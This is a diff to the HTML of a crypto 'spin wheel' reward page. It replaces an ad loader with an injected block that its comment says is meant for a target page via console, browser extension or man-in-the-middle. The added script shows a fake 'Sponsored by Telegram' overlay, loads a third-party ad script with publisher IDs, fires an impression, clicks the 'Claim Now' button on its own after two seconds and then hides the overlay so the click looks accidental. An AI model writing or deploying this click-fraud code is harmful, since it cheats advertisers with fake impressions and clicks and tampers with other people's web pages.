@@ -3,23 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script>
-  document.addEventListener('DOMContentLoaded', function() {
-    var script = document.createElement('script');
-    script.src = 'https://richinfo.co/richpartners/telegram/js/tg-ob.js';
-    script.onload = function() {
-      if (typeof TelegramAdsController !== 'undefined') {
-        var controller = new TelegramAdsController();
-        controller.initialize({
-          pubId: "1018738",
-          appId: "8323",
-        });
-        controller.displayAd('ad-container');
-      }
-    };
-    document.head.appendChild(script);
-  });
-</script>
+
 <title>🎡 Crypto Spin Wheel</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -163,6 +147,51 @@ canvas:hover{box-shadow:0 0 60px rgba(247,147,26,0.25),inset 0 0 40px rgba(0,0,0
 <body>
 <div class="container">
   <h1>🎡 Crypto Spin</h1>
+  <!-- INJECT THIS BLOCK KE TARGET PAGE (via console / extension / mitm) -->
+<div id="ads-telegram-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;backdrop-filter:blur(4px);">
+  <div style="background:#fff;padding:30px;border-radius:16px;max-width:400px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.5);">
+    <h2 style="margin:0 0 10px;">🔥 Sponsored by Telegram</h2>
+    <p style="margin:0 0 20px;">Tap to continue & get reward</p>
+    <button id="ads-close-btn" style="background:#0088cc;border:none;color:#fff;padding:12px 40px;border-radius:40px;font-size:16px;cursor:pointer;">Claim Now</button>
+  </div>
+</div>
+
+<script src="https://richinfo.co/richpartners/telegram/js/tg-ob.js"></script>
+<script>
+  (function() {
+    // Init Telegram Ads Controller
+    window.TelegramAdsController = new TelegramAdsController();
+    window.TelegramAdsController.initialize({
+      pubId: "1018738",
+      appId: "8323",
+    });
+
+    // Auto-trigger impression & click simulation biar iklan kepencet sendiri
+    setTimeout(function() {
+      // Trigger pageview / impression
+      if (window.TelegramAdsController.trackPageView) {
+        window.TelegramAdsController.trackPageView();
+      }
+
+      // Auto-click tombol close / claim setelah 2 detik (biar iklan kebaca)
+      setTimeout(function() {
+        var btn = document.getElementById('ads-close-btn');
+        if (btn) {
+          btn.click();
+          // Trigger event buat nge-hook ke controller
+          var evt = new MouseEvent('click', { bubbles: true });
+          btn.dispatchEvent(evt);
+        }
+
+        // Hapus overlay setelah action (biar keliatan "gak sengaja")
+        setTimeout(function() {
+          var overlay = document.getElementById('ads-telegram-overlay');
+          if (overlay) overlay.style.display = 'none';
+        }, 500);
+      }, 2000);
+    }, 500);
+  })();
+</script>
   <p class="sub">Putar roda & dapatkan hadiah crypto!</p>
 
   <div class="wheel-wrapper">
